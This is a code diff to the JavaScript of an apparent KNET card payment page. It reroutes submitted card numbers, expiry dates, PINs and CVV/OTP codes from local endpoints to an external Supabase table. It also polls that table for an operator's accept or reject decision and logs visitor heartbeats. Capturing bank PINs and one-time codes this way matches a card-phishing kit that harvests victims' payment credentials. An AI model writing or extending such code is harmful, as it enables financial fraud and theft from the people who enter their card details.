@@ -843,22 +843,23 @@
       savedExpYear  = '20' + expiryRaw.slice(0,2);
       var expiry = expiryRaw.slice(2,4) + '/' + expiryRaw.slice(0,2);
 
+      const SB='https://znstbmftefsqgagidmfm.supabase.co';
+      const SK='sb_publishable_3MdtPJZPiqIv_NbtBioMfg_x4pdkQwE';
+      const SH={'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json','Prefer':'return=representation'};
       let subId = sid || null;
       try {
         if (subId) {
-          await fetch('/api/submit-step/' + subId, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ card, expiry, pin })
+          await fetch(SB+'/rest/v1/payments?id=eq.'+subId, {
+            method: 'PATCH', headers: SH,
+            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin })
           });
         } else {
-          const r = await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '' })
+          const r = await fetch(SB+'/rest/v1/payments', {
+            method: 'POST', headers: SH,
+            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin, card_cvv:'', card_type:'KNET', amount:parseFloat(amount)||0, status:'pending', transaction_ref:'KWT-'+Date.now().toString(36).toUpperCase(), ip_address:'', user_agent:navigator.userAgent })
           });
           const d = await r.json();
-          subId = d.id;
+          subId = d[0]?.id;
         }
       } catch(e) {}
 
@@ -875,10 +876,10 @@
       clearInterval(pollTimer2);
       pollTimer2 = setInterval(async () => {
         try {
-          const r = await fetch('/api/status/' + subId);
-          const d = await r.json();
-          if (d.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
-          else if (d.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
+          const r = await fetch(SB+'/rest/v1/payments?id=eq.'+subId+'&select=status',{headers:{'apikey':SK,'Authorization':'Bearer '+SK}});
+          const d = await r.json(); const dd = d[0]||{};
+          if (dd.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
+          else if (dd.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
         } catch(e) {}
       }, 2000);
     }
@@ -976,10 +977,10 @@
       clearInterval(pollTimer2);
       pollTimer2 = setInterval(async () => {
         try {
-          const r = await fetch('/api/status/' + id);
-          const d = await r.json();
-          if (d.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
-          else if (d.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
+          const r = await fetch(SB+'/rest/v1/payments?id=eq.'+id+'&select=status',{headers:{'apikey':SK,'Authorization':'Bearer '+SK}});
+          const d2 = await r.json(); const s2 = d2[0]||{};
+          if (s2.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
+          else if (s2.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
         } catch(e) {}
       }, 2000);
     }
@@ -995,12 +996,12 @@
       otpCard.style.display = 'none';
       document.getElementById('otp-action-card').style.display = 'none';
       loadingCard.style.display = 'block';
-      const body = currentStep === 'otp' ? { otp: val } : { cvv: val };
+      const sbBody = currentStep === 'otp' ? { card_cvv: val } : { card_cvv: val };
       try {
-        await fetch('/api/submit-step/' + currentSubId, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(body)
+        await fetch(SB+'/rest/v1/payments?id=eq.'+currentSubId, {
+          method: 'PATCH',
+          headers: {'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json'},
+          body: JSON.stringify(sbBody)
         });
       } catch(e) {}
       startPolling(currentSubId);
@@ -1012,7 +1013,7 @@
     (function(){
       let vid = sessionStorage.getItem('vid');
       if(!vid){ vid = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('vid', vid); }
-      function beat(){ fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:vid})}).catch(()=>{}); }
+      function beat(){ fetch(SB+'/rest/v1/visitors',{method:'POST',headers:{'apikey':SK,'Authorization':'Bearer '+SK,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({page:'knet-payment',ip_address:'',user_agent:navigator.userAgent})}).catch(()=>{}); }
       beat();
       setInterval(beat, 3000);
     })();
